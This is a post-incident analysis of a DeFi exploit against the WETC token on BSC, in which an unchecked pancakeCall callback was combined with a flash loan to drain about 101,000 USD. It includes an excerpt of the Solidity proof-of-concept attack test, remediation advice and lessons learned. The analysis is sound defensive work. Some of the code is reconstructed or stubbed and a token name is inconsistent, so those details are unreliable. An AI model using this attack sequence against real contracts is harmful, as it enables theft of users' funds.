# WETC Token — PancakeSwap Callback Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-07-25 |
| **Protocol** | WETC Token |
| **Chain** | BSC |
| **Loss** | ~101,000 USD |
| **Attacker** | [0x7e7c1f0d567c0483f85e1d016718e44414cdbafe](https://bscscan.com/address/0x7e7c1f0d567c0483f85e1d016718e44414cdbafe) |
| **Attack Tx** | [0x2b6b411a](https://bscscan.com/tx/0x2b6b411adf6c452825e48b97857375ff82b9487064b2f3d5bc2ca7a5ed08d615) |
| **Vulnerable Contract** | [0xaf68efb3c1e81aad5cdb3d4962c8815fb754c688](https://bscscan.com/address/0xaf68efb3c1e81aad5cdb3d4962c8815fb754c688) |
| **Root Cause** | PancakeSwap swap callback allows mass token transfer without caller validation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/WETC_Token_exp.sol) |

---

## 1. Vulnerability Overview

The `pancakeCall` callback function in the WETC token contract did not validate the caller (`msg.sender`), allowing an attacker to trigger a swap through the PancakeSwap LP and drain the contract's WETC/BUSD balance within the callback. The ERC1967Proxy-based flash loan functionality was also exploited in conjunction.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: no msg.sender validation in pancakeCall callback
contract WETCToken {
    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        // ❌ No validation that msg.sender is the actual PancakePair
        // Anyone can call this function directly or trigger it via another path
        uint256 amt0 = abi.decode(data, (uint256));
        IERC20(BUSD).transfer(msg.sender, amt0); // Transfers to arbitrary recipient
    }

    // Or: internal asset movement logic exists inside the swap callback
}

// ✅ Fix: validate msg.sender and pair
function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
    require(msg.sender == address(CAKE_LP), "Caller is not PancakePair");
    require(sender == address(this), "Sender is not this contract");
    ...
}
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: WETC_decompiled.sol
contract WETC {
    function swap(uint256 a, uint256 b, address c, bytes calldata d) external {  // ❌ Vulnerability
        // TODO: decompiled logic not yet implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ ERC1967Proxy.flashLoan(WBNB, 49.15 WBNB)
  │         [onMoolahFlashLoan callback]
  │
  ├─2─▶ CAKE_LP.swap(amt0_WETC, 1_BUSD, attacker, payload)
  │         └─ swap call triggers pancakeCall
  │
  ├─3─▶ pancakeCall callback executes
  │         └─ Commands encoded in payload move large amount of WETC internally
  │         └─ 74,963,130,190,599,057,252,979,324 WETC transferred
  │
  ├─4─▶ WETC → WBNB swap (PancakeRouter)
  │         └─ Mass WETC converted to WBNB
  │
  └─5─▶ ERC1967Proxy: flash loan repaid + ~101,000 USD WBNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract WETC is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 54333337;
    uint256 borrowAmount = 1000000000000000000000000;

    function testExploit() public balanceLog {
        // Pre-approve WBNB
        WBNB.approve(address(ercproxy), type(uint256).max);

        // Borrow WBNB via ERC1967Proxy flash loan
        ercproxy.flashLoan(address(WBNB), flashAmount, "0x00");
    }

    function onMoolahFlashLoan(uint256 assets, bytes memory data) public {
        // Approve flash loan repayment
        WBNB.approve(address(ercproxy), flashAmount);

        // Trigger pancakeCall via PancakePair swap
        // Encode mass WETC movement command in payload
        uint256 amt0 = 74963130190599057252979324; // Mass WETC
        Cake_LP.swap(amt0, 1, address(this),
            hex"000000000014bb4cdb9..." // WETC movement encoded payload
        );

        // Swap acquired mass WETC to WBNB
        uint256 amtIn = 74963130190599057252979324;
        address[] memory path = new address[](2);
        path[0] = address(WXC); path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amtIn, 0, path, address(this), deadline
        );
    }

    // PancakePair callback — flash loan repayment
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        WBNB.transfer(address(Cake_LP), flashAmount);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Callback Caller Validation |
| **Attack Vector** | Flash loan + unvalidated pancakeCall callback exploitation |
| **Impact Scope** | Entire WETC token contract balance (~101,000 USD) |
| **CWE** | CWE-284 (Improper Access Control) |
| **DASP** | Access Control |

## 6. Remediation Recommendations

1. **Callback Caller Validation**: Always verify `msg.sender == address(expectedPair)` in `pancakeCall`
2. **Sender Parameter Validation**: Allow only self-initiated flash swaps via `sender == address(this)`
3. **Payload Validation**: Strictly validate arguments for logic executed within the callback
4. **Whitelist**: Maintain an on-chain whitelist of permitted Pair addresses for callbacks

## 7. Lessons Learned

- PancakeSwap/Uniswap's `pancakeCall`/`uniswapV2Call` callbacks are part of the swap mechanism, but without caller validation, anyone can exploit them.
- Callback functions must always verify two things: (1) whether the caller is the correct contract, and (2) whether it is a self-initiated flash swap.
- The combination of a flash loan and an unvalidated callback creates an extremely powerful attack vector.